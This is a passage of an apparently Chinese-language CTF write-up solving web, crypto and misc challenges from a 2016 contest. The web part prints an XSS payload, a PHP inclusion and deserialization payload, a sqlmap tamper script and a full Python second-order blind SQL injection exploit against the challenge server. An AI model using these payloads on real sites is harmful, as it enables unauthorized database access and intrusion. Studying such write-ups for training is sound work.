</code></p><p>xss，直接构造payload<code>&lt;BODY%2BONLOAD%253Dalert%2528%2527XSS%2527%2529&gt;</code></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/66687170.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/66687170.jpg"></a></p><h2 id="233-150"><a href="#233-150" class="headerlink" title="233(150)"></a>233(150)</h2><blockquote><p>少年，老套路，你都懂得~  <a href="http://huashan.xdsec.cn/233/">http://huashan.xdsec.cn/233/</a></p></blockquote><p>查看源代码 能看到是JSfuck编码 解码 </p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:11:22%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:11:22%20"></a></p><p>得到加密后的一句话木马<br><strong>┼攠數畣整爠煥敵瑳∨䁥祳ぴ㍧≴┩&gt;</strong><br>解密得到一句话密码<code>e@syt0g3t</code><br>得到 <code>flag_Xd&#123;hSh_ctf:e@syt0g3t&#125;</code></p><h2 id="无间道-200"><a href="#无间道-200" class="headerlink" title="无间道(200)"></a>无间道(200)</h2><blockquote><p>无间道：放你的人来我这？~ <a href="http://huashan.xdsec.cn/upload/index.php">http://huashan.xdsec.cn/upload/index.php</a></p></blockquote><p>利用“php很烦人”那题得到index.php源码，flag就在其中</p><p>正确解法：<br>一道上传截断题目,过程不多说。直接fuzz %80~%00中间的字符,即可上传成功,得到返回的flag。由于上传删除文件的过程有延时,可能存在竞争上传问题。</p><h2 id="Mory-try"><a href="#Mory-try" class="headerlink" title="Mory try"></a>Mory try</h2><p>没做出来<br>看了师傅们的wp<br>过程大概是<br><strong>role参数里是两次base64编码，测试后可以注入。使用sqlmap的random user-agent绕过一下，并编写两次base64的tamper：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload</span>):</span></span><br><span class="line">    retVal = payload</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = base64.b64encode(retVal)</span><br><span class="line">    retVal = urllib.quote(retVal)</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><p>然后就能得到flag<br><code>flag_xd&#123;hsh_ctf:sql_succeed!&#125;</code></p><h2 id="php很烦人-200"><a href="#php很烦人-200" class="headerlink" title="php很烦人(200)"></a>php很烦人(200)</h2><blockquote><p>但php仍然是世界上最好的语言   <a href="http://huashan.xdsec.cn/php/">http://huashan.xdsec.cn/php/</a><br>发包，看到源码。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$pass &#x3D; $_GET[&quot;pass&quot;];</span><br><span class="line"></span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); &#x2F;&#x2F;class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>是让传三个参数<code>user,file,pass</code>，然后先构造<code>user=php://input</code>,post值<code>the user is admin</code>。<code>file=class.php</code>，<code>pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;</code>反序列化去读取<code>f1a9.php</code>。直接出<code>flag</code>。</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/78532530.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-10/78532530.jpg"></a></p><h2 id="三秒钟记忆-300"><a href="#三秒钟记忆-300" class="headerlink" title="三秒钟记忆(300)"></a>三秒钟记忆(300)</h2><blockquote><p>三秒钟记忆</p></blockquote><p>最近只有三秒钟记忆，忘记的事情总是要一遍一遍的找回来…<br><a href="http://huashan.xdsec.cn/pic">http://huashan.xdsec.cn/pic</a></p><p>这题也没做出来</p><p>也是看了师傅们的wp<br>**<code>二次注入，触发点在密码找回那边。exp：</code>**</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#by mathias@xdsec</span></span><br><span class="line"><span class="comment"># Copyright (c) 7 team  All rights reserved</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regist</span>(<span class="params">usr</span>):</span></span><br><span class="line">    flag=<span class="literal">False</span></span><br><span class="line">    url=<span class="string">&quot;http://huashan.*****.cn/pic/index.php?page=login&quot;</span></span><br><span class="line">    payload=&#123;<span class="string">&#x27;name&#x27;</span>:usr,<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;register&#x27;</span>:<span class="string">&#x27;%E6%B3%A8%E5%86%8C&#x27;</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    txt=r.text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Duplicate&#x27;</span> <span class="keyword">in</span> txt <span class="keyword">or</span> len(txt)==<span class="number">503</span>:</span><br><span class="line">        flag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">usr</span>):</span></span><br><span class="line">    flag=<span class="literal">False</span></span><br><span class="line">    url=<span class="string">&quot;http://huashan.*****.cn/pic/index.php?page=login&quot;</span></span><br><span class="line">    payload=&#123;<span class="string">&#x27;name&#x27;</span>:usr,<span class="string">&#x27;reset&#x27;</span>:<span class="string">&#x27;%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81&#x27;</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    <span class="keyword">if</span> len(r.text)==<span class="number">460</span>:</span><br><span class="line">        flag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://huashan.*****.cn/pic/index.php?page=login&quot;</span></span><br><span class="line">    flag=<span class="literal">False</span></span><br><span class="line">    user=str(random.randint(<span class="number">10000000000</span>,<span class="number">99999999999</span>))</span><br><span class="line">    p=user+<span class="string">&#x27;\&#x27; and (select ascii(substr(flag,1,1)) from flag)&gt;50#&#x27;</span> </span><br><span class="line">    flag=regist(user)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;regist &quot;</span>+user+<span class="string">&quot; error&quot;</span></span><br><span class="line">        os._exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;regist &quot;</span>+user+<span class="string">&quot; success&quot;</span></span><br><span class="line"></span><br><span class="line">    flag=regist(p)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;regist &quot;</span>+p+<span class="string">&quot; error&quot;</span></span><br><span class="line">        os._exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;regist &quot;</span>+p+<span class="string">&quot; success,now reset password&quot;</span></span><br><span class="line"></span><br><span class="line">    flag=reset(p)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Reset success,now inject&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;reset &quot;</span>+p+<span class="string">&quot; error&quot;</span></span><br><span class="line">        os._exit()</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://huashan.*****.cn/pic/index.php?page=login&quot;</span></span><br><span class="line">    payload=&#123;<span class="string">&#x27;name&#x27;</span>:user,<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;login&#x27;</span>:<span class="string">&#x27;%E7%99%BB%E5%BD%95&#x27;</span>&#125;</span><br><span class="line">    r=requests.post(url,data=payload)</span><br><span class="line">    <span class="keyword">if</span> len(r.text)==<span class="number">486</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;payload is wrong&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;payload is right&quot;</span></span><br></pre></td></tr></table></figure><h2 id="疯狂的JS-300"><a href="#疯狂的JS-300" class="headerlink" title="疯狂的JS(300)"></a>疯狂的JS(300)</h2><blockquote><p>疯狂的js，老师给我布置了一道js题，作为js小白的我做不到啊，大家帮忙看看吧~</p></blockquote><p>这个也是没做出来的<br><strong>题在出题过程中可能借鉴了</strong> <a href="https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/halphow2js">这里</a><br>payload：<a href="http://js.xdsec.cn/myajax?a=2.0&amp;b=2.00&amp;c=2.000&amp;d=7&amp;e=762">http://js.xdsec.cn/myajax?a=2.0&amp;b=2.00&amp;c=2.000&amp;d=7&amp;e=762</a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="紧急报文"><a href="#紧急报文" class="headerlink" title="紧急报文"></a>紧急报文</h2><blockquote><p>解密一下这份截获的密文吧，时间就是机会！<br>FA XX DD AG FF XG FD XG DD DG GA XF FA</p></blockquote><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:16:03%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:16:03%20"></a></p><h2 id="is-it-x-or-z"><a href="#is-it-x-or-z" class="headerlink" title="is it x or z ?"></a>is it x or z ?</h2><blockquote><p>is it x or z ?<br>100<br>你可以解密这些残损的文件吗？</p></blockquote><p>明文1和密文1异或得到key<br>密文2的key从最后个字母f开始循环<br>异或得到明文2</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:23:24%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:23:24%20"></a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-  </span></span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"><span class="keyword">import</span> struct   </span><br><span class="line">  </span><br><span class="line"><span class="comment">#每个字节转成hex，0x顺便去掉，对于不足两位的补0  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params">str</span>):</span>  </span><br><span class="line">    hexs = []  </span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str:  </span><br><span class="line">        tmp = (hex(ord(s)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))  </span><br><span class="line">        <span class="keyword">if</span> len(tmp) == <span class="number">2</span>:  </span><br><span class="line">            hexs.append(tmp)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            hexs.append(<span class="string">&#x27;0&#x27;</span>+tmp)  </span><br><span class="line">    <span class="keyword">return</span> hexs  </span><br><span class="line">  </span><br><span class="line">arr  = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]  </span><br><span class="line">arr2 = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tran</span>(<span class="params">r</span>):</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):  </span><br><span class="line">        <span class="keyword">if</span> r == arr[i]:  </span><br><span class="line">            <span class="keyword">return</span> arr2[i]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">          </span><br><span class="line">f = open(<span class="string">&#x27;crypt-2.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)  </span><br><span class="line">f2 = open(<span class="string">&#x27;key.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)  </span><br><span class="line">hexs = []  </span><br><span class="line">hexs2 = []  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:   </span><br><span class="line">    t = f.readline()  </span><br><span class="line">    t2 = f2.readline()  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> t <span class="keyword">or</span> <span class="keyword">not</span> t2:  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">    hexs.extend(str2hex(t))  </span><br><span class="line">    hexs2.extend(str2hex(t2))  </span><br><span class="line">f.close()  </span><br><span class="line">f2.close()  </span><br><span class="line">  </span><br><span class="line">ff = open(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(min(len(hexs),len(hexs2))):  </span><br><span class="line">    a = tran(hexs[i][<span class="number">0</span>])*<span class="number">16</span>+tran(hexs[i][<span class="number">1</span>])  </span><br><span class="line">    b = tran(hexs2[i][<span class="number">0</span>])*<span class="number">16</span>+tran(hexs2[i][<span class="number">1</span>])  </span><br><span class="line">    B = struct.pack(<span class="string">&#x27;B&#x27;</span>,a^b)  </span><br><span class="line">    ff.write(B)      </span><br><span class="line">ff.close()  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分组加密检测-150"><a href="#分组加密检测-150" class="headerlink" title="分组加密检测(150)"></a>分组加密检测(150)</h2><blockquote><p>分组加密模式检测</p></blockquote><p>文件（challenge.txt）包含base64编码后的密文，其中某段密文采用的加密模式不太一样，请找出，并以该段密文base64解码后的前16个字符作为flag提交。</p><p>先全部base64解码 然后再去检测<br><a href="https://github.com/truongkma/ctf-tools/tree/master/cryptopals-solutions-master/set1/8">Github</a>上面有项目 下载下来跑一下就是了 </p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:26:18%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:26:18%20"></a></p><h2 id="修复一下这份邀请函部分内容-200"><a href="#修复一下这份邀请函部分内容-200" class="headerlink" title="修复一下这份邀请函部分内容(200)"></a>修复一下这份邀请函部分内容(200)</h2><blockquote><p>修复一下这份邀请函的部分内容</p></blockquote><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:28:03%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:28:03%20"></a></p><p>红色部分就是flag 了</p><h2 id="时间决定一切-350"><a href="#时间决定一切-350" class="headerlink" title="时间决定一切(350)"></a>时间决定一切(350)</h2><blockquote><p>时间决定一切</p></blockquote><p>考验大家人品的时候到啦！！！<br><a href="http://huashan.xdsec.cn/mima/">http://huashan.xdsec.cn/mima/</a></p><p>利用“php很烦人”那题得到index.php源码，flag就在其中</p><p>正确解法：<br><a href=""></a></p><p><a href="https://github.com/SpiderLabs/CryptOMG/blob/master/ctf/challenge3/index.php">参考链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo gjVGaqJZOnjm54LirXgElRIAOnb8oVEWfkj&#x2F;7medMRU&#x3D; | base64 -d | xxd</span><br><span class="line">00000000: 8235 466a a259 3a78 e6e7 82e2 ad78 0495  .5Fj.Y:x.....x..</span><br><span class="line">00000010: 1200 3a76 fca1 5116 7e48 ffee 679d 3115  ..:v..Q.~H..g.1.</span><br></pre></td></tr></table></figure><p>从侧信道攻击的角度考虑，我们可以依次比较每个字符，对于不同的输入数据，执行10000次操作，耗费的时间是不同的，这样逐个字符破解，就可以得到目标值。</p><h2 id="协议？认证？加密？-300"><a href="#协议？认证？加密？-300" class="headerlink" title="协议？认证？加密？(300)"></a>协议？认证？加密？(300)</h2><blockquote><p>协议？认证？加密？</p></blockquote><p>安全也需要融合！</p><p>更新了一下代码</p><p>顺便做个分析</p><p>在流量包里面能找到关键信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">T connection 0.0.0.0:12345 at Fri Sep 09 13:14:22 2016 succeed!</span><br><span class="line">R OK</span><br><span class="line">T Welcome to the Humen DH-AES Key eXchange System!</span><br><span class="line">R OK</span><br><span class="line">T g:7</span><br><span class="line">R OK</span><br><span class="line">T p:1023789085312022807</span><br><span class="line">R OK</span><br><span class="line">T A:651518302569801068</span><br><span class="line">R OK</span><br><span class="line">T Give your Para-B?</span><br><span class="line">R 310117834581236149</span><br><span class="line">T</span><br><span class="line">Secrct data!</span><br><span class="line">&#x2F;ReO]]0000   53 65 63 ** ** ** ** 64 61 74 61 21 0a 2f a0 c7  Secrct data!.&#x2F;..</span><br><span class="line">0010   a1 0e 0d 87 a5 8f 52 bd dd d4 65 d0 b0 8e 4f ba  ......R...e...O.</span><br><span class="line">0020   da ba e6 93 90 fc d7 c2 5d 91 5d fa d1           ........].]..</span><br></pre></td></tr></table></figure><p><strong>DH-AES</strong>规则<br>先定p和g  然后双方随机 a和b<br>计算出A和B传给对方。双方进行运算<br>(g^b%p)   (g^a%p)分别是B ，A</p><p>(g^b%p)^a%p=(g^a%p)^b%p</p><p>B^a%p=A^b%p   ————就是Key<br>其中的g p是公开的。a,b是私密的。<br>这样就能进行加密运算了 所以我们要解密也是需要知道key的<br>所以只要得到** pow(B,a,p)** 或者  **pow(A,b,p) **</p><p>总结一下<br>A选择一个随机数c,(0&lt;c&lt;p)，发送g<strong>c mod p给B，作为公钥；将c妥善保管作为私钥<br>B选择一个随机数d,(0&lt;d&lt;p)，发送g</strong>d mod p给A，作为公钥；将d妥善保管作为私钥<br>此时A、B双方都能计算K=(g<strong>c mod p)**d=(g</strong>d mod p)<strong>c=(g</strong>cd mod p)，即K即为A、B之间的密钥</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="number">274389752</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">651518302569801068</span></span><br><span class="line"></span><br><span class="line">B = <span class="number">310117834581236149</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">1023789085312022807</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># a的计算  这里考的是离散对数</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">myA = <span class="number">7</span></span><br><span class="line"><span class="keyword">while</span> myA != A:</span><br><span class="line">    myA = myA*<span class="number">7</span> % p</span><br><span class="line">    a += <span class="number">1</span></span><br><span class="line"><span class="comment"># a = 274389752</span></span><br><span class="line"><span class="comment"># 计算明文</span></span><br><span class="line">key = pow(B,a,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(key)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;0bb82841e54d05dd&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#key = hashlib.md5(key).digest()</span></span><br><span class="line">cipher = AES.new(key,AES.MODE_CBC,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;2fa0c7a10e0d87a58f52bdddd465d0b08e4fbadabae69390fcd7c25d915dfad1&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> cipher.decrypt(c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Try-Everything-200"><a href="#Try-Everything-200" class="headerlink" title="Try Everything(200)"></a>Try Everything(200)</h2><blockquote><p>Try Everything  try everything you can to get flag, and DO NOT ASK MANAGER THE FLAG.</p></blockquote><p>这题的file若是直接解压的话，得到的内容是乱序的，但是仔细一看flag形式的字样都有，于是关键是如何调整顺序，这里借用binwalk</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:31:46%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:31:46%20"></a></p><p>得到文件的偏移量<br>里面文件每个地址对应了不同的文件名（序号还不同），所以只要把里面的offset整理好，然后写个脚本分离源文件到各个小文件，然后解压，再按数字来排序就可以。<br>以下脚本基于自己先整理出了offset，以及建立了一个out文件夹</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">f_all=open(<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment">#print len(f_all)</span></span><br><span class="line">l1=[<span class="number">0</span>   , <span class="number">24</span>  , <span class="number">48</span>  , <span class="number">73</span>  , <span class="number">98</span>  , <span class="number">122</span> , <span class="number">146</span> , <span class="number">170</span> , <span class="number">195</span> , <span class="number">220</span> , <span class="number">245</span> , <span class="number">270</span> , <span class="number">295</span> , <span class="number">319</span> , <span class="number">344</span> , <span class="number">368</span> , <span class="number">393</span> , <span class="number">418</span> , <span class="number">443</span> , <span class="number">467</span> , <span class="number">491</span> , <span class="number">515</span> , <span class="number">539</span> , <span class="number">562</span> , <span class="number">586</span> , <span class="number">611</span> , <span class="number">635</span> , <span class="number">659</span> , <span class="number">683</span> , <span class="number">708</span> , <span class="number">732</span> , <span class="number">756</span> , <span class="number">781</span> , <span class="number">806</span> , <span class="number">829</span> , <span class="number">853</span> , <span class="number">877</span> , <span class="number">901</span> , <span class="number">925</span> , <span class="number">950</span> , <span class="number">975</span> , <span class="number">999</span> , <span class="number">1024</span>, <span class="number">1048</span>, <span class="number">1071</span>, <span class="number">1095</span>, <span class="number">1120</span>, <span class="number">1144</span>, <span class="number">1168</span>, <span class="number">1192</span>, <span class="number">1216</span>, <span class="number">1241</span>, <span class="number">1265</span>, <span class="number">1290</span>, <span class="number">1315</span>, <span class="number">1340</span>, <span class="number">1364</span>, <span class="number">1389</span>, <span class="number">1412</span>, <span class="number">1436</span>, <span class="number">1460</span>, <span class="number">1484</span>, <span class="number">1508</span>, <span class="number">1533</span>, <span class="number">1557</span>, <span class="number">1582</span>, <span class="number">1607</span>, <span class="number">1631</span>, <span class="number">1656</span>, <span class="number">1681</span>, <span class="number">1705</span>, <span class="number">1729</span>, <span class="number">1753</span>, <span class="number">1777</span>, <span class="number">1802</span>, <span class="number">1825</span>, <span class="number">1849</span>, <span class="number">1873</span>, <span class="number">1898</span>, <span class="number">1923</span>, <span class="number">1947</span>, <span class="number">1971</span>, <span class="number">1995</span>, <span class="number">2020</span>, <span class="number">2044</span>, 